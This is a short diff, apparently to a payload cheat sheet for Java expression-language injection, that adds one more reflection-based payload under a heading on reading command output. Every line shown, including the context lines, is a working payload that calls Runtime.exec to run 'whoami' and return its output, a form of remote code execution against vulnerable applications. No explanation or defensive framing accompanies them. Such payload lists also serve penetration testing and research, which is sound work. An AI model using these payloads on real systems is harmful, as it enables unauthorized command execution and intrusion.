@@ -54,6 +54,7 @@ T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream().readAllBytes()
 ## Reading command output (strings)
 ```java
 "".getClass().forName("java.lang.String").getConstructor("".getClass().forName("[B")).newInstance("".class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("whoami").getInputStream().readAllBytes())
+new java.lang.String("".class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("whoami").getInputStream().readAllBytes())
 ```
 
 ## Get current path
